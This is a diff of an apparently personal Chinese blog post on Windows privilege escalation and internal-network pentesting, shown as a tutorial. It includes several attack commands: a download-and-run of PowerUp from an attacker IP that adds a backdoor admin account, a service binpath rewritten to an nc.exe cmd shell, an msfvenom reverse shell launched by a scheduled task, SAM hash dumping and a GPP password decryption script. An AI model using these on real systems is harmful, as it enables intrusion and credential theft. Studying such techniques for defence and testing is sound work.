@@ -18,7 +18,7 @@
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://yoursite.com/2019/04/22/windows内网渗透思路/alwaysinstallelasted_gpedit.png">
 <meta property="og:image" content="http://yoursite.com/2019/04/22/windows内网渗透思路/alwaysinstallelasted_regedit.png">
-<meta property="og:updated_time" content="2019-05-30T15:34:07.356Z">
+<meta property="og:updated_time" content="2019-06-09T16:18:57.903Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Pentesting test in windows">
 <meta name="twitter:description" content="简介最近开始接触windows内网渗透相关的知识, 暂定路线是单主机渗透提权、域渗透; 本文记录windows的信息收集 本文整理搜集到的windows内网渗透相关的一些知识, 后续将这些知识进行沉淀.">
@@ -271,16 +271,49 @@ Server Message Block是WIndows下的一个协议，
 <li>0x26 错误配置</li>
 </ul>
 <h3 id="0x20-内核"><a href="#0x20-内核" class="headerlink" title="0x20 内核"></a>0x20 内核</h3><p>Windows爆出过很多的本地提权漏洞，通过搜集exploit-db上的本地提权poc和对应的漏洞编号及补丁号再结合powershell script查看已打的补丁号就可以找到可利用本地提权漏洞，该部分的内容重在收集。<br>关于这部分内容，已经有前人总结并形成脚本，可自行在github上搜索。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找已打的补丁号</span></span><br><span class="line">$ wmic qfe get Caption,Description,HotFixID,InstalldOn</span><br></pre></td></tr></table></figure></p>
-<h3 id="0x21-服务"><a href="#0x21-服务" class="headerlink" title="0x21 服务"></a>0x21 服务</h3><p>Windows下的服务常见的安全风险为：权限配置错误、服务路径带空格且安装路径未用双引号闭合</p>
+<h3 id="0x21-服务"><a href="#0x21-服务" class="headerlink" title="0x21 服务"></a>0x21 服务</h3><p>Windows下的服务常见的安全风险为：服务路径带空格且安装路径未用双引号闭合、不安全的服务权限</p>
 <h4 id="不带引号的服务路径"><a href="#不带引号的服务路径" class="headerlink" title="不带引号的服务路径"></a>不带引号的服务路径</h4><p><strong>简介</strong><br>Windows的目录支持空格, 含有空格的目录被引用时安全的做法是用双引号闭合路径, 如果含有空格的路径未闭合windows将从左向右开始解析, 比如: <code>C:\Program File\360 service\av.exe</code>, windows将先后查找:<code>C:\Program.exe</code>、<code>C:\Program File\360.exe</code>、<code>C:\Program File\360 service\av.exe</code>, 一旦找到经运行对应的文件.<br>Windows下的服务一般以SYSTEM权限或Administrator权限运行, 当服务的程序路径(BINARY_PATH_NAME)中包含空格时, 如果对应的目录可写则可以向目录中写入对应的恶意程序, 然后手工重启服务或等待服务重启时运行恶意程序进行提权.</p>
 <p><strong>PowerUp Exp</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 运行下面的命令将从远程下载powerup.ps并在内存中运行, 然后在unquoted service的可利用目录下写入恶意程序创建管理员账号: backdoor/Password123!</span><br><span class="line">$ powershell.exe -nop -exec bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://&lt;attack&apos;s ip&gt;/PowerUp.ps1&apos;); Write-ServiceBinary -ServiceName &lt;target service name&gt; -Path &lt;target service unquoted path&gt; -UserName backdoor -Password Password123!&quot;</span><br></pre></td></tr></table></figure></p>
+<h4 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h4><p>该提权方法与<strong>不安全的注册表权限</strong>类似, 但此处不修改服务的<strong>ImagePath</strong>注册表值而是修改服务的属性。<br>为了检查服务权限是否有漏洞, 可下载微软提供的工具AccessChk, 这是Microsoft的Sysinternals Suite中的一个工具, 可以从<a href="http://technet.microsoft.com/en-us/sysinternals/bb842062.aspx" target="_blank" rel="noopener">here</a>下载。</p>
+<p>sc查看服务信息<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># sc命令用于查询、配置和管理windows的服务</span><br><span class="line"></span><br><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt; <span class="title">sc</span> <span class="title">qc</span> <span class="title">Spooler</span></span></span><br><span class="line"><span class="function">[<span class="title">SC</span>] <span class="title">QueryServiceConfig</span> <span class="title">SUCCESS</span></span></span><br><span class="line"><span class="function"><span class="title">SERVICE_NAME</span>: <span class="title">Spooler</span></span></span><br><span class="line"><span class="function">        <span class="title">TYPE</span>               : 110  <span class="title">WIN32_OWN_PROCESS</span> (<span class="title">interactive</span>)</span></span><br><span class="line"><span class="function">        <span class="title">START_TYPE</span>         : 2   <span class="title">AUTO_START</span></span></span><br><span class="line"><span class="function">        <span class="title">ERROR_CONTROL</span>      : 1   <span class="title">NORMAL</span></span></span><br><span class="line"><span class="function">        <span class="title">BINARY_PATH_NAME</span>   : <span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">System32</span>\<span class="title">spoolsv.exe</span></span></span><br><span class="line"><span class="function">        <span class="title">LOAD_ORDER_GROUP</span>   : <span class="title">SpoolerGroup</span></span></span><br><span class="line"><span class="function">        <span class="title">TAG</span>                : 0</span></span><br><span class="line"><span class="function">        <span class="title">DISPLAY_NAME</span>       : <span class="title">Print</span> <span class="title">Spooler</span></span></span><br><span class="line"><span class="function">        <span class="title">DEPENDENCIES</span>       : <span class="title">RPCSS</span></span></span><br><span class="line"><span class="function">                           : <span class="title">http</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_START_NAME</span> : <span class="title">LocalSystem</span></span></span><br></pre></td></tr></table></figure></p>
+<p>用accesschk.exe查看服务的权限<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># We can see the permissions that each user level has, you can also use "accesschk.exe -ucqv *" to list</span><br><span class="line">all services.</span><br><span class="line"></span><br><span class="line"><span class="function">C:\&gt; <span class="title">accesschk.exe</span> -<span class="title">ucqv</span> <span class="title">Spooler</span></span></span><br><span class="line"><span class="function"><span class="title">Spooler</span></span></span><br><span class="line"><span class="function">  <span class="title">R</span>  <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">Authenticated</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_QUERY_STATUS</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_QUERY_CONFIG</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_INTERROGATE</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ENUMERATE_DEPENDENTS</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_USER_DEFINED_CONTROL</span></span></span><br><span class="line"><span class="function">        <span class="title">READ_CONTROL</span></span></span><br><span class="line"><span class="function">  <span class="title">R</span>  <span class="title">BUILTIN</span>\<span class="title">Power</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_QUERY_STATUS</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_QUERY_CONFIG</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_INTERROGATE</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ENUMERATE_DEPENDENTS</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_START</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_USER_DEFINED_CONTROL</span></span></span><br><span class="line"><span class="function">        <span class="title">READ_CONTROL</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">BUILTIN</span>\<span class="title">Administrators</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">SYSTEM</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br></pre></td></tr></table></figure></p>
+<p>检查当前权限可操作的服务<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"># win10</span><br><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">b33f</span>\<span class="title">tools</span>\<span class="title">Sysinternals</span>&gt; <span class="title">accesschk.exe</span> -<span class="title">uwcqv</span> "<span class="title">Authenticated</span> <span class="title">Users</span>" *</span></span><br><span class="line"><span class="function"><span class="title">Accesschk</span> <span class="title">v6</span>.12 - <span class="title">Reports</span> <span class="title">effective</span> <span class="title">permissions</span> <span class="title">for</span> <span class="title">securable</span> <span class="title">objects</span></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> (<span class="title">C</span>) 2006-2017 <span class="title">Mark</span> <span class="title">Russinovich</span></span></span><br><span class="line"><span class="function"><span class="title">Sysinternals</span> - <span class="title">www.sysinternals.com</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Error</span> <span class="title">opening</span> <span class="title">Authenticated</span> <span class="title">Users</span>:</span></span><br><span class="line"><span class="function">?????????</span></span><br><span class="line"><span class="function"><span class="title">No</span> <span class="title">matching</span> <span class="title">objects</span> <span class="title">found</span>.</span></span><br><span class="line"><span class="function"># <span class="title">win</span> <span class="title">xp</span> <span class="title">xp1</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">accesschk.exe</span> -<span class="title">uwcqv</span> "<span class="title">Authenticated</span> <span class="title">Users</span>" *</span></span><br><span class="line"><span class="function"><span class="title">RW</span> <span class="title">SSDPSRV</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function"><span class="title">RW</span> <span class="title">upnphost</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 查服务权限</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">accesschk.exe</span> -<span class="title">ucqv</span> <span class="title">SSDPSRV</span></span></span><br><span class="line"><span class="function"><span class="title">SSDPSRV</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">SYSTEM</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">BUILTIN</span>\<span class="title">Administrators</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">Authenticated</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">BUILTIN</span>\<span class="title">Power</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">LOCAL</span> <span class="title">SERVICE</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">accesschk.exe</span> -<span class="title">ucqv</span> <span class="title">upnphost</span></span></span><br><span class="line"><span class="function"><span class="title">upnphost</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">SYSTEM</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">BUILTIN</span>\<span class="title">Administrators</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">Authenticated</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">BUILTIN</span>\<span class="title">Power</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">LOCAL</span> <span class="title">SERVICE</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br></pre></td></tr></table></figure></p>
+<p>低权限用户可作为所有人权限操作服务的问题在XP SP2中被解决。该问题可作为通用的本地提权漏洞，通过重新配置服务，我们可以用SYSTEM权限运行指定的二进制文件。 eg:<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 此处选择unpnhost服务，上面查出的两个服务中任一个均可</span><br><span class="line"></span><br><span class="line"># 查服务信息</span><br><span class="line">sc qc upnphost</span><br><span class="line"></span><br><span class="line"># 配置服务的binpath路径</span><br><span class="line">sc config upnphost binpath= "C:\nc.exe -nv <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">9988</span> -e C:\WINDOWS\System32\<span class="built_in">cmd</span>.exe"</span><br><span class="line"></span><br><span class="line"># 修改服务的obj配置</span><br><span class="line">sc config upnphost obj= ".\LocalSystem" password= ""</span><br><span class="line"></span><br><span class="line"># 查询服务的配置</span><br><span class="line">sc qc upnphost</span><br><span class="line"></span><br><span class="line"># 重启服务</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">start</span> upnphost</span><br></pre></td></tr></table></figure></p>
+<p>即使服务的权限配置不正确，我们也不总是拥有服务的完全访问权限。不同账号的权限如所示:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SERVICE_CHANGE_CONFIG   可以配置服务的二进制程序Can reconfigure the service binary</span><br><span class="line">WRITE_DAC               可以配置权限, leading to SERVICE_CHANGE_CONFIG</span><br><span class="line">WRITE_OWNER             可以成为所有者，配置权限</span><br><span class="line">GENERIC_WRITE           继承SERVICE_CHANGE_CONFIG的权限</span><br><span class="line">GENERIC_ALL             继承SERVICE_CHANGE_CONFIG的权限</span><br></pre></td></tr></table></figure></p>
 <h3 id="0x22-dll"><a href="#0x22-dll" class="headerlink" title="0x22. dll"></a>0x22. dll</h3><p>常见的dll提权方式为DLL注入和DLL劫持，具体原理及利用手法后续研究和总结。</p>
+<h4 id="dll劫持"><a href="#dll劫持" class="headerlink" title="dll劫持"></a>dll劫持</h4><p>原理: 当windows应用动态加载动态链接库(dll)时, 如果没有指定完整路径名, windows将尝试搜索预定义的路径来定位待加载的dll。 如果攻击者可以控制预定义路径中的任何一个就有可能导致dll劫持。</p>
+<p>进程动态加载dll时, 系统会按如下顺序加载dll:</p>
+<ul>
+<li>应用程序加载的目录</li>
+<li>系统目录</li>
+<li>16位的系统目录</li>
+<li>windows目录</li>
+<li>当前目录</li>
+<li>PATH环境变量中列出的目录</li>
+</ul>
+<p>为了利用dll劫持, 我们需要:</p>
+<ul>
+<li>检查进程查找的dll是否存在与磁盘上</li>
+<li>如果不存在, 将恶意dll放置在上述任一目录中即可</li>
+<li>如果存在, 尝试将恶意dll放在更高优先级的目录中</li>
+</ul>
+<h4 id="2-dll注入"><a href="#2-dll注入" class="headerlink" title="2.dll注入"></a>2.dll注入</h4><p>待总结</p>
 <h3 id="0x23-注册表"><a href="#0x23-注册表" class="headerlink" title="0x23 注册表"></a>0x23 注册表</h3><p>WIndows下的注册表类似于windows系统的数据库，记载windows系统的配置并改变windows系统的行为；默认情况下，注册表的权限是安全的，但是，在企业中可能有各种原因导致需要修改注册表的权限来确保第权限的业务方操作对应的注册表内容，如果这个过程没有配置好权限就可能导致提权。<br>关于注册表提权的手法后续研究和总结。</p>
-<h3 id="0x24-计划任务"><a href="#0x24-计划任务" class="headerlink" title="0x24 计划任务"></a>0x24 计划任务</h3><h3 id="0x25-文件"><a href="#0x25-文件" class="headerlink" title="0x25. 文件"></a>0x25. 文件</h3><p>Windows，作为用户量最大的个人PC霸占着大部分企业的办公电脑系统，办公电脑中又经常保存开发环境、测试环境、生产环境的各种机器账号和密码；所以，对于文件中密钥的搜集是提权中重要且成本低的手法。<br>目前已经有大量的工具用于提取windows系统中文件中的密码，这些文件包括：浏览器的数据文件、远程控制工具的数据文件、组策略首选项文件、Windows密钥文件</p>
+<h3 id="0x24-计划任务-Administrator-to-SYSTEM"><a href="#0x24-计划任务-Administrator-to-SYSTEM" class="headerlink" title="0x24 计划任务(Administrator to SYSTEM)"></a>0x24 计划任务(Administrator to SYSTEM)</h3><p><strong>Tips</strong> 该方法仅使用与Windows 2000、XP或2003计算机, 必须拥有本地管理员权限才能管理计划任务, 因为计划任务的创建和修改必须使用管理员权限的账号, 如果是一个普通用户权限的账户或meterpreter会话则无法利用此方法提权。</p>
+<p>在Windows 2000、XP或2003计算机上，计划任务以SYSTEM权限运行, 这意味这如果我们创建一个执行恶意文件的计划任务, 恶意文件将以SYSTEM权限执行</p>
+<p>相关命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># msf创建反弹shell</span><br><span class="line">$ msgvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_na LHOST=&lt;your ip&gt; LPORT=&lt;your port&gt; -f exe -o Payload.exe</span><br><span class="line"></span><br><span class="line"># cmd命令开启计划任务(必须以管理员权限运行)</span><br><span class="line">$ net start &quot;Task Scheduler&quot;</span><br><span class="line"></span><br><span class="line"># 创建计划任务</span><br><span class="line">$ at 06:42 /interactive &quot;C:\Documents and Settings\test\Local Settings\Temp\Payload.exe&quot;</span><br></pre></td></tr></table></figure></p>
+<h3 id="0x25-文件"><a href="#0x25-文件" class="headerlink" title="0x25. 文件"></a>0x25. 文件</h3><p>Windows，作为用户量最大的个人PC霸占着大部分企业的办公电脑系统，办公电脑中又经常保存开发环境、测试环境、生产环境的各种机器账号和密码；所以，对于文件中密钥的搜集是提权中重要且成本低的手法。<br>目前已经有大量的工具用于提取windows系统中文件中的密码，这些文件包括：浏览器的数据文件、远程控制工具的数据文件、组策略首选项文件、Windows密钥文件</p>
 <h4 id="从浏览器文件中提取凭证"><a href="#从浏览器文件中提取凭证" class="headerlink" title="从浏览器文件中提取凭证"></a>从浏览器文件中提取凭证</h4><p>chrome: <a href="https://github.com/hassaanaliw/chromepass" target="_blank" rel="noopener">chromepass</a><br>firefox: <a href="https://github.com/unode/firefox_decrypt" target="_blank" rel="noopener">firefox_decrypt</a></p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python chromepass.py -d</span><br><span class="line">$ python firefox_decrypt.py</span><br></pre></td></tr></table></figure>
 <h4 id="从远控工具中提取凭证"><a href="#从远控工具中提取凭证" class="headerlink" title="从远控工具中提取凭证"></a>从远控工具中提取凭证</h4><p>PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP<a href="https://github.com/Arvanaghi/SessionGopher" target="_blank" rel="noopener">here</a>、mRemoteNG<a href="https://github.com/kmahyyg/mremoteng-decrypt" target="_blank" rel="noopener">here</a></p>
-<h4 id="组策略首选项文件"><a href="#组策略首选项文件" class="headerlink" title="组策略首选项文件"></a>组策略首选项文件</h4><p>在Windows域环境中, 有时需要从域控下发全局组策略在域内机器上执行, 这时候会用到SYSVOS的共享目录, 共享目录中存放用于执行组策略的账户和加密后的密钥. 该功能在Windows Server 2008中引入, 组策略首选项中指定的账户的凭证被加密存储在Groups.xml文件中, 密码为XML中的<strong>cpassword</strong>字段。</p>
+<h4 id="组策略首选项文件"><a href="#组策略首选项文件" class="headerlink" title="组策略首选项文件"></a>组策略首选项文件</h4><p>在Windows域环境中, 有时需要从域控下发全局组策略在域内机器上执行, 这时候会用到SYSVOS的共享目录, 共享目录中存放用于执行组策略的账户和加密后的密钥. 该功能在Windows Server 2008中引入, 组策略首选项中指定的账户的凭证被加密存储在Groups.xml文件中, 密码为XML中的<strong>cpassword</strong>字段。常见组策略为难如下所示:</p>
+<ul>
+<li>Services\Services.xml</li>
+<li>ScheduledTasks\ScheduledTasks.xml</li>
+<li>Printers\Printers.xml</li>
+<li>Drives\Drives.xml</li>
+<li>DataSources\DataSources.xml</li>
+</ul>
 <p>微软公开了用于加密的公钥创建并被公开, 因此组策略中的密码可以被破解； 组策略中一般指定Administrator账号, 所以一旦破解便可以用管理员身份登陆主机实现提权。</p>
 <p>Groups.xml文件存储在共享文件中, 任何经过身份验证的用户都可以读取该文件, 因为访问该文件才能够进行组策略更新。 为了利用该问题, 需要寻找groups.xml文件的位置。<br>用于加密存储的公钥如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8</span><br><span class="line">f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b</span><br></pre></td></tr></table></figure></p>
 <p><strong>破解工具</strong><br><a href="http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip" target="_blank" rel="noopener">gp3finder</a><br><a href="http://www.twitter.com/carnal0wnage" target="_blank" rel="noopener">carnal0wnage</a>编写的ruby脚本<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'rubygems'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'openssl'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'base64'</span></span><br><span class="line"> </span><br><span class="line">encrypted_data = <span class="string">"j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(encrypted_data)</span></span></span><br><span class="line">padding = <span class="string">"="</span> * (<span class="number">4</span> - (encrypted_data.length % <span class="number">4</span>))</span><br><span class="line">epassword = <span class="string">"<span class="subst">#&#123;encrypted_data&#125;</span><span class="subst">#&#123;padding&#125;</span>"</span></span><br><span class="line">decoded = Base64.decode64(epassword)</span><br><span class="line"> </span><br><span class="line">key = <span class="string">"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\</span></span><br><span class="line"><span class="string">x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\</span></span><br><span class="line"><span class="string">x33\xb6\x6c\x1b"</span></span><br><span class="line">aes = OpenSSL::Cipher::Cipher.new(<span class="string">"AES-256-CBC"</span>)</span><br><span class="line">aes.decrypt</span><br><span class="line">aes.key = key</span><br><span class="line">plaintext = aes.update(decoded)</span><br><span class="line">plaintext &lt;&lt; aes.final</span><br><span class="line">pass = plaintext.unpack(<span class="string">'v*'</span>).pack(<span class="string">'C*'</span>) <span class="comment"># UNICODE conversion </span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> pass</span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"> </span><br><span class="line">blah = decrypt(encrypted_data)</span><br><span class="line">puts blah</span><br></pre></td></tr></table></figure></p>
@@ -288,14 +321,15 @@ Server Message Block是WIndows下的一个协议，
 <p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1" target="_blank" rel="noopener">PowerShplit</a><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Get-CachedGPPPassword //For locally stored GP Files</span><br></pre></td></tr></table></figure></p>
 <h4 id="Windows密钥文件"><a href="#Windows密钥文件" class="headerlink" title="Windows密钥文件"></a>Windows密钥文件</h4><p>Windows系统的账号密码保存在C:/Windows/System32/config目录下的SYSTEM、SAM文件中，通过samdump2可以将密钥提取出来。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ samdump2 SYSTEM SAM -o /tmp/ntlm_hash.txt</span><br></pre></td></tr></table></figure></p>
 <h3 id="0x26-错误配置"><a href="#0x26-错误配置" class="headerlink" title="0x26 错误配置"></a>0x26 错误配置</h3><p>Windows系统的复杂性导致了出现错误配置的可能行，该部分对系统的错误配置可能导致提权的方法进行研究和总结。</p>
-<h4 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h4><p>该配置译为永远以高权限安装，在Windows 2000及以上可用；该配置是msi安装程序的安装配置，如果指了AlwaysInstallElevalted, 则普通用户安装msi文件时，将以本地系统管理员(NT AUTHORITY\SYSTEM)的权限进行安装，可安装提权msi程序进行提权。该配置默认为未配置，微软<strong>强烈建议</strong>不要开启此配置，所以请关闭此配置。<br>查看该配置状态的方法：</p>
+<h4 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h4><p>该配置译为总是以高权限安装，在Windows 2000及以上可用；该配置作用于通过windows installer安装的应用程序，如果指了AlwaysInstallElevalted, 则普通用户安装应用程序文件时，将以本地系统管理员(NT AUTHORITY\SYSTEM)的权限进行安装，可安装提权msi程序进行提权。该配置默认为未配置，微软<strong>强烈建议</strong>不要开启此配置，所以请关闭此配置。<br>查看该配置状态的方法：</p>
 <ol>
 <li><p>打开cmd运行gpedit.msc，在”计算机配置(Computer Configuration)” - “管理模版(Administrative Templates)” - “windows组件(Windows Components)” - “Windows Installer”中可以找到”永远以高权限进行安装(Always install with elevated)”，右键选中”属性”即可看到当前配置<br><img src="alwaysinstallelasted_gpedit.png" alt="gpedit"></p>
 </li>
 <li><p>查注册表”HKEY_CURRENT_USER”和”HKEY_LOCAL_MACHINE”中的”Software” - “Policies” - “Microsoft” - “Windows” - “Installer”下是否有”EnableAdminTSRemote”键，如果存在且值不等于0则可以提权；否则无法提权。<br><img src="alwaysinstallelasted_regedit.png" alt="regedit"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># This will only work if both registry keys contain &quot;AlwaysInstallElevated&quot; with DWORD values of 1.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span><br><span class="line">C:\Windows\system32&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span><br></pre></td></tr></table></figure>
 </li>
 </ol>
